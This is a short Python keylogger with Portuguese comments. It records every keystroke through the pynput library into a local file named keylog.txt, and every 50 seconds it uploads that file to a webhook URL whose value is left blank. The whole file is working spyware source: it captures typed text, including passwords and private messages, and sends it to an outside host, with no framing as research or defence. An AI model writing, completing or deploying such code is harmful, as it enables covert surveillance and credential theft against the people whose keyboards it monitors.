import time
from pynput import keyboard
import requests

webhook_url = ""  

ignore = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    
}
def on_press(key):
    try: #tecla normal
        with open("keylog.txt", "a", encoding="utf-8") as file:
            file.write(key.char)
    except AttributeError: #tecla especial
            with open("keylog.txt", "a", encoding="utf-8") as file:
                if key == keyboard.Key.space:
                    file.write(" ")
                elif key == keyboard.Key.enter:
                    file.write("\n")
                elif key == keyboard.Key.tab:
                     file.write("\t")
                elif key == keyboard.Key.backspace:
                    file.write(" ")
                elif key == keyboard.Key.esc:
                     file.write("[ESC]")
                elif key in ignore:
                    pass
                else:
                    file.write(f"[{key}]")

def enviar_arquivo():
    with open("keylog.txt", "rb") as file:
        files = {"file": file}
        resposta = requests.post(
            webhook_url,
            json={"content": "Arquivo de log de teclas"},
            files=files,
            timeout=10
        ) 
def main():
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            time.sleep(50)
            enviar_arquivo()
    listener.join()  
if __name__ == "__main__":
    main()


